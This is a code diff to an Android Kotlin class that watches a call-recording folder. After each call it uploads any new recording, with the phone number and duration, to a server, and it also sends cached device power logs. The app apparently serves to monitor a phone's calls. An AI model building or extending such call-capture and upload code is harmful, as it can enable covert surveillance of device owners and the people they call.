@@ -1,16 +1,15 @@
 package an.xuan.tong.historycontact.call.receiver
 
 import an.xuan.tong.historycontact.Constant
-import an.xuan.tong.historycontact.Utils.CurrentTime
+import an.xuan.tong.historycontact.Utils.Utils
 import an.xuan.tong.historycontact.api.ApiService
 import an.xuan.tong.historycontact.api.Repository
 import an.xuan.tong.historycontact.api.model.InformationResponse
 import an.xuan.tong.historycontact.api.model.CallLogServer
+import an.xuan.tong.historycontact.api.model.PowerAndInternet
 import an.xuan.tong.historycontact.call.CallRecord
 import an.xuan.tong.historycontact.call.helper.PrefsHelper
-import an.xuan.tong.historycontact.call.receiver.PhoneCallReceiver
 import an.xuan.tong.historycontact.location.LocationCurrent
-import an.xuan.tong.historycontact.realm.ApiCaching
 import an.xuan.tong.historycontact.realm.CachingCallLog
 import an.xuan.tong.historycontact.realm.HistoryContactConfiguration
 import an.xuan.tong.historycontact.realm.RealmUtils
@@ -25,7 +24,6 @@ import io.realm.Realm
 import okhttp3.MediaType
 import okhttp3.MultipartBody
 import okhttp3.RequestBody
-import retrofit2.http.GET
 import java.io.File
 import java.io.IOException
 import java.util.Date
@@ -43,8 +41,16 @@ internal class CallRecordReceiver : PhoneCallReceiver {
     private var audiofile: File? = null
     private var isRecordStarted = false
     var startTime = 0L
+    var mSizeFodelCall = -1;
 
-    constructor()
+    constructor(){
+        RealmUtils.getAllPowerCaching()?.let {
+            if (it.size > 0) {
+                val listPowCaching = it.first()
+                sendPowerCaching(listPowCaching?.id, listPowCaching?.datecreate, listPowCaching?.isPowerOn)
+            }
+        }
+    }
 
     constructor(callRecord: CallRecord) {
         this.callRecord = callRecord
@@ -56,33 +62,34 @@ internal class CallRecordReceiver : PhoneCallReceiver {
 
     override fun onIncomingCallAnswered(context: Context, number: String, start: Date) {
         Log.e("antx", "call onIncomingCallAnswered")
-        if (RealmUtils.isActive())
-            startRecord(context, "incoming", number)
+        mSizeFodelCall = Utils.sizeFolder()
     }
 
     override fun onIncomingCallEnded(context: Context, number: String, start: Date, end: Date) {
-        Log.e("antx", "call onIncomingCallEnded")
         if (RealmUtils.isActive())
-            stopRecord(context, number, start, end, false)
+            if (mSizeFodelCall != Utils.sizeFolder()) {
+                sendRecoderToServer(Utils.getFilePathNew(), number, Utils.getDuration(File(Utils.getFilePathNew())), false)
+            }
+
 
     }
 
     override fun onOutgoingCallStarted(context: Context, number: String, start: Date) {
-        if (RealmUtils.isActive())
-            startRecord(context, "outgoing", number)
-        Log.e("antx", "call onOutgoingCallStarted")
+        mSizeFodelCall = Utils.sizeFolder()
     }
 
     override fun onOutgoingCallEnded(context: Context, number: String, start: Date, end: Date) {
         Log.e("antx", "call onOutgoingCallEnded")
         if (RealmUtils.isActive())
-            stopRecord(context, number, start, end, true)
-
+            if (mSizeFodelCall != Utils.sizeFolder()) {
+                Utils.getDuration(File(Utils.getFilePathNew()))
+                sendRecoderToServer(Utils.getFilePathNew(), number, Utils.getDuration(File(Utils.getFilePathNew())), true)
+            }
     }
 
     override fun onMissedCall(context: Context, number: String, start: Date) {
         Log.e("antx", "call onMissedCall")
-        var dateStop = CurrentTime.getLocalTime()
+        var dateStop = Utils.getLocalTime()
         if (RealmUtils.isActive())
             insertCall(number, dateStop.toString(), (0).toString(), "", null, "")
     }
@@ -128,7 +135,7 @@ internal class CallRecordReceiver : PhoneCallReceiver {
                     recorder!!.start()
                     isRecordStarted = true
                     onRecordingStarted(context, callRecord, audiofile)
-                    startTime = CurrentTime.getLocalTime()
+                    startTime = Utils.getLocalTime()
                     Log.i(TAG, "record start")
                 } else {
                     releaseMediaRecorder()
@@ -158,7 +165,7 @@ internal class CallRecordReceiver : PhoneCallReceiver {
                 audiofile?.path?.let {
                     val file = File(it)
                     Log.e("antx", "path " + it + " name: " + file.name + " start" + start + "end: " + end)
-                    sendRecoderToServer(it, number, start, end, isOutGoingCall)
+                    sendRecoderToServer(it, number, Utils.getDuration(File(Utils.getFilePathNew())), isOutGoingCall)
                 }
 
                 Log.i(TAG, "record stop")
@@ -271,7 +278,7 @@ internal class CallRecordReceiver : PhoneCallReceiver {
         private var recorder: MediaRecorder? = null
     }
 
-    private fun sendRecoderToServer(filePath: String, number: String, startDate: Date, endDate: Date, typeCall: Boolean) {
+    private fun sendRecoderToServer(filePath: String, number: String, duration: String, typeCall: Boolean) {
         try {
             val file = File(filePath)
             val result: HashMap<String, String> = HashMap()
@@ -285,17 +292,13 @@ internal class CallRecordReceiver : PhoneCallReceiver {
                     .subscribe(
                             { result ->
                                 if (result.isNotEmpty()) {
-                                    var diffInMs = endDate.time - startDate.time
-                                    var diffInSec = diffInMs / 1000
-                                    var dateStop = CurrentTime.getLocalTime()
-                                    insertCall(number, dateStop.toString(), (diffInSec).toString(), result[0], typeCall, filePath)
+                                    var dateStop = Utils.getLocalTime()
+                                    insertCall(number, dateStop.toString(), duration, result[0], typeCall, filePath)
                                 }
                             },
                             { e ->
-                                var diffInMs = endDate.time - startDate.time
-                                var diffInSec = diffInMs / 1000
-                                var dateStop = CurrentTime.getLocalTime()
-                                insertCall(number, dateStop.toString(), (diffInSec).toString(), filePath, typeCall, filePath)
+                                var dateStop = Utils.getLocalTime()
+                                insertCall(number, dateStop.toString(), duration, filePath, typeCall, filePath)
                             })
         } catch (e: Exception) {
             Log.e("antx Exception", "sendRcoderToServer " + e.message)
@@ -336,10 +339,24 @@ internal class CallRecordReceiver : PhoneCallReceiver {
                             })
         }
     }
-
-    private fun convertJsonToObject(json: String?): InformationResponse {
-        return Gson().fromJson(json, object : TypeToken<InformationResponse?>() {}.type)
+    private fun sendPowerCaching(cachingId: Int?, dateCreate: String?, status: Boolean?) {
+        val result: java.util.HashMap<String, String> = java.util.HashMap()
+        result["Authorization"] = RealmUtils.getAuthorization()
+        var id = RealmUtils.getAccountId()
+        var message = PowerAndInternet(id, dateCreate, status)
+        Log.e("sendPowerCaching", " " + message.toString())
+        id?.let {
+            Repository.createService(ApiService::class.java, result).insertPowerLog(message.toMap(), Constant.KEY_API)
+                    .subscribeOn(Schedulers.io())
+                    .retry(3)
+                    .observeOn(AndroidSchedulers.mainThread())
+                    .subscribe(
+                            {
+                                RealmUtils.deleteItemPower(cachingId)
+                            },
+                            { e ->
+                                Log.e("antx", "sendPowerCaching eror " + e.message)
+                            })
+        }
     }
-
-
 }
